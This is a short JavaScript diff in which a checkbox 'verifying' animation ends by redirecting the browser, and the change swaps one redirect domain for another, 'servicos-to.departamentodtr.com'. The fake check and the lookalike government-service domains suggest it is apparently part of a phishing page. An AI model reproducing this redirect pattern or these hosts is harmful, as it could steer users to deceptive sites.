@@ -74,7 +74,7 @@ check.addEventListener("change", () => {
     checkArea.classList.remove("verifying");
     verifying = false;
     setTimeout(() => {
-      window.location.href = "https://expresso.go-veicular.online/";
+      window.location.href = "https://servicos-to.departamentodtr.com/";
     }, 800);
   }, 1000);
 });
